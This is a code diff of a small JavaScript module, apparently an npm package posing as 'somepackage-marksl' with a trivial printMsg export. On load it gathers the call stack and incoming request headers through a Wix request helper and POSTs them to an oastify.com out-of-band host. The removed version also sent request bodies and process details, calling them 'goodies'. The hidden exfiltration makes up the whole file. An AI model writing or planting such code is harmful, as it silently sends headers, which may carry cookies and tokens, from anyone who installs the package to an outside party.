@@ -1,43 +1,25 @@
-const https = require('https');
-const util = require('util')
+const https = require('https')
 
 async function main() {
 
-    // stack
+    // getting the callstack
     const error = new Error();
     Error.captureStackTrace(error);
     const callStack = error.stack;
 
     // request
+    const getCurrentRequest = require('@wix/wix-request');
     const currentRequest = await getCurrentRequest();
-    const currentRequestInspected = util.inspect(currentRequest, {showHidden: false, depth: 2});
     const reqHeaders = currentRequest.headers;
-    const reqBody = currentRequest.request.body;
 
-    // process.domain
-    const domain = util.inspect(global.process.domain, {showHidden: false, depth: 2});
-
-    // objects i want to send
-    const goodies = {
-        domain,
-        reqHeaders,
-        reqBody,
-        currentRequestInspected, // object too big, send to webhooksite
-        callStack
-    }
-
-    for (let [key, value] of Object.entries(goodies)) {
-        logToWebhook({key, value});
-    }
-}
-
-async function logToWebhook(log) {
-
-    const data = JSON.stringify(log);
+    const data = JSON.stringify({
+        callStack,
+        reqHeaders
+    });
 
     const options = {
-        hostname: 'onfc5kfxrb1avwcksz6o9dmhw825q7ew.oastify.com',
-        path: '/',
+        hostname: 'yhjmzu97llvkp66um90y3ngrqiwfki87.oastify.com',
+        path: '/somepackage-marksl',
         method: 'POST',
         headers: {
             'Content-Length': data.length
@@ -47,6 +29,10 @@ async function logToWebhook(log) {
     const req = https.request(options)
     req.write(data);
     req.end();
+
+    exports.printMsg = function() {
+        console.log("marksl test");
+    }
 }
 
 main();
